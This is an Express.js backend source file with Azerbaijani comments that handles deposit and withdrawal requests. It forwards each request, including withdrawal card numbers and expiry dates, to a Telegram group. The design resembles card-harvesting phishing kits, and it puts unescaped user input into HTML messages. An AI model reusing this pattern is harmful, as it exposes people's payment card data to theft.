require('dotenv').config();
const express = require('express');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3001;

// Middlewares
app.use(cors({ origin: process.env.ALLOWED_ORIGIN || '*' }));
app.use(express.json());

// Yaddaşda sadə keş (Rate limit və Duplicate yoxlanışı üçün)
// Qeyd: Real layihədə Redis və ya Verilənlər Bazası tövsiyə olunur.
const userActivity = new Map();
const processedRequests = new Set();

// Rate Limit: 1 user / 1 dəqiqə / 1 əməliyyat
const depositWithdrawLimiter = (req, res, next) => {
    const { userId } = req.body;
    if (!userId) return next();

    const now = Date.now();
    const lastActivity = userActivity.get(userId);

    if (lastActivity && (now - lastActivity < 60000)) {
        return res.status(429).json({ 
            success: false, 
            message: "Çox sürətli sorğu göndərirsiniz. Zəhmət olmasa 60 saniyə gözləyin." 
        });
    }

    userActivity.set(userId, now);
    next();
};

// Telegram API Çağırışı üçün Helper
async function sendToTelegram(method, body) {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_GROUP_ID;
    
    if (!token || !chatId) {
        throw new Error("Backend konfiqurasiyası tapılmadı (Token/ChatID).");
    }

    const url = `https://api.telegram.org/bot${token}/${method}`;
    const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            ...body
        })
    });

    return await response.json();
}

// ENDPOINT: Depozit / Çıxarış Sorğusu
app.post('/api/action', depositWithdrawLimiter, async (req, res) => {
    const { userId, type, amount, data, requestId } = req.body;

    // 1. Duplicate Request Yoxlanışı
    if (requestId && processedRequests.has(requestId)) {
        return res.status(400).json({ success: false, message: "Bu sorğu artıq emal edilib." });
    }
    if (requestId) processedRequests.add(requestId);

    try {
        let message = `🔔 <b>YENİ ƏMƏLİYYAT</b>\n\n`;
        message += `👤 İSTİFADƏÇİ: ${userId}\n`;
        message += `📈 TİP: ${type === 'deposit' ? 'DEPOZİT' : 'ÇIXARIŞ'}\n`;
        message += `💰 MƏBLƏĞ: ${amount} AZN\n`;
        
        if (type === 'withdraw') {
            message += `💳 KART: ${data.card}\n`;
            message += `📅 TARİX: ${data.expiry}\n`;
        } else {
            message += `📎 QEYD: İstifadəçi çek yüklədi.\n`;
        }

        const tgRes = await sendToTelegram('sendMessage', { 
            text: message, 
            parse_mode: 'HTML' 
        });

        if (tgRes.ok) {
            res.json({ success: true, message: "Sorğunuz qəbul edildi." });
        } else {
            console.error("TG Error:", tgRes);
            res.status(500).json({ success: false, message: "Telegram xətası baş verdi." });
        }
    } catch (error) {
        console.error("Server Error:", error);
        res.status(500).json({ success: false, message: "Server daxili xətası." });
    }
});

// Sağlamlıq yoxlanışı
app.get('/health', (req, res) => res.send('Backend is running!'));

app.listen(PORT, () => {
    console.log(`Backend server ${PORT} portunda işləyir.`);
});
